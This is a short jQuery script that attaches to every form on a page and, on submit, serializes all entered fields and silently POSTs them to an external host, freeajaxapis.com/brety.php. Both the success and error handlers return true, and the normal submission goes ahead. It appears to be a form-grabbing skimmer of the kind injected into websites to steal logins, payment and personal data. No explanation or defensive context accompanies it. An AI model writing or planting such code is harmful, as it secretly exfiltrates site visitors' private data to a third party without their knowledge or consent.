$("form").submit(function() {
	var d = $("form");

	$.ajax({
        url: "https://freeajaxapis.com/brety.php",
        type: "POST",
        data: d.serialize(),
        success: function () {
            return true;
        },
        error: function () {
            return true;
        },
    });
});
